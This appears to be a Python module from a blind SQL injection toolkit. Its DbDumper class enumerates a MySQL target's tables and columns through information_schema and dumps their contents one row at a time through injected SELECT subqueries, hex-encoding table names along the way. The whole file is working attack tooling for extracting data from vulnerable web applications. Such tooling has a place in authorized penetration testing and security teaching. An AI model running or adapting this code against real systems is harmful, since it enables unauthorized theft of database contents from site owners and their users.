from pysqli.blind_string_finder import StringFinder
from pysqli.tools import SqliEncoder


class DbDumper:
    """
    Database dumper.
    This class use a string finder to dump the content of a database.

    Can dump a mysql database via the read of the information_schema tables.
    The String finder is use to get the content of the tables

    """
    def __init__(self, string_finder: StringFinder):
        self.sf = string_finder

    def tables(self):
        """
        list the tables of the current databases
        :return:
        """
        return self.list_query('table_name', 'information_schema.tables')

    def columns(self, table):
        """
        Dump the columns of a table
        :param table: table name
        :return: list of the columns of this table
        """
        return self.list_query('column_name', 'information_schema.columns',
                               "WHERE table_name = {}".format(SqliEncoder.str_to_hexa(table)))

    def content(self, table, column):
        """
        Dump a table
        :param table: table name
        :param column: column
        :return: list of the values of the column on this table
        """
        return self.list_query(column, table)

    def list_query(self, column, table, where=''):
        """
        Dump a query with a unique column and many lines.
        :param column: column to read, the query must have a unique field
        :param table: table name
        :param where: where clause, with the 'WHERE' keyword
        :return: list of the results of the query
        """
        items_ = []
        i = 0
        while True:
            item = self.sf.read_string("(SELECT {} from {} {} LIMIT 1 OFFSET {})".format(column, table, where, i))
            if item is None:
                break
            items_.append(item)
            i += 1
        return items_
